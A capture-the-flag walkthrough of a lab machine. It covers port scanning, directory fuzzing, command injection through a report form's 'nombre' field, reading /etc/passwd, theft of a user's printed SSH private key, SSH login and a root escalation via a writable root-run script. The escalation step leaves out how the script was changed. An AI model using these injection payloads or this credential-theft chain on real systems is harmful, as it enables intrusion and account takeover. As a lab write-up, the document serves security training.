# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.123 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.041 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1013ms
rtt min/avg/max/mdev = 0.041/0.082/0.123/0.041 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 15:15 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: D2:CE:16:00:CD:75 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```
``` bash
sudo nmap -p22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 15:15 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f5:4f:86:a5:d6:14:16:67:8a:8e:b6:b6:4a:1d:e7:1f (ECDSA)
|_  256 e6:86:46:85:03:d2:99:70:99:aa:70:53:40:5d:90:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Generador de Reportes - Centro de Operaciones
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: D2:CE:16:00:CD:75 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds
```
# Web enumeration
## Dir fuzzing
``` bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 2832]
upload.html          (Status: 200) [Size: 2314]
upload.php           (Status: 200) [Size: 33]
old                  (Status: 301) [Size: 306] [--> http://172.17.0.2/old/]
server-status        (Status: 403) [Size: 275]
Progress: 830564 / 830564 (100.00%)
===============================================================
Finished
===============================================================
```
## Command injection
At index.php there's a form to upload a report
``` bash
curl -s -X POST http://172.17.0.2/index.php --data "nombre=; whoami" --data "fecha=test" | grep www-data
www-data
```
``` bash
curl -s -X POST http://172.17.0.2/index.php --data "nombre=; cat /etc/passwd" --data "fecha=test" | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
samara:x:1001:1001:samara,,,:/home/samara:/bin/bash
```
## SSH keys
``` bash
curl -s -X POST http://172.17.0.2/index.php --data "nombre=; ls -l /home/samara/.ssh/" --data "fecha=test"
-rw-r--r-- 1 root   root    745 Aug 20  2024 authorized_keys
-rw-r--r-- 1 samara samara 3389 Aug 20  2024 id_rsa
-rw-r--r-- 1 samara samara  745 Aug 20  2024 id_rsa.pub
```
``` bash
curl -s -X POST http://172.17.0.2/index.php --data "nombre=; cat /home/samara/.ssh/id_rsa" --data "fecha=test"
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
# SSH
``` bash
cat > id_rsa_samara << EOF
heredoc> -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
EOF
```
``` bash
chmod 600 id_rsa_samara
```
``` bash
ssh samara@172.17.0.2 -i id_rsa_samara
```
# User flag
``` bash
cat user.txt
030208509edea7480a10b84baca3df3e
```
# Privilege escalation
``` bash
ps -ef | grep root
root           1       0  6 20:12 ?        00:02:00 /bin/sh -c service ssh start && service apache2 start && while true; do /bin/bash /usr/local/bin/echo.sh; done
root          15       1  0 20:12 ?        00:00:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          33       1  0 20:12 ?        00:00:00 /usr/sbin/apache2 -k start
root     1928626      15  0 20:42 ?        00:00:00 sshd: samara [priv]
samara   2176175 1928721  0 20:46 pts/0    00:00:00 grep --color=auto root
root     2176176       1  0 20:46 ?        00:00:00 /bin/bash /usr/local/bin/echo.sh
```
``` bash
ls -l /usr/local/bin/echo.sh
-rwxrw-rw- 1 root root 82 Aug 20  2024 /usr/local/bin/echo.sh
```
``` bash
/bin/bash -p
whoami
root
```
# Root flag
``` bash
cat /root/root.txt
640c89bbfa2f70a4038fd570c65d6dcc
```
